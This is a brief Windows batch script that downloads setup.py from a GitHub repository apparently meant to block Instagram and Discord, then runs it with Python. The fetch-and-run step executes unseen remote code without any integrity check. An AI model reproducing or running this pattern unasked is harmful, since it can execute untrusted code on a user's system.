@echo off
SET REPO_URL=https://raw.githubusercontent.com/Himynameiskevin/Disabling-Instagram-and-Discord-Forever/main

REM Download the setup script
powershell -Command "Invoke-WebRequest -Uri %REPO_URL%/setup.py -OutFile setup.py"

REM Run the setup script
python setup.py
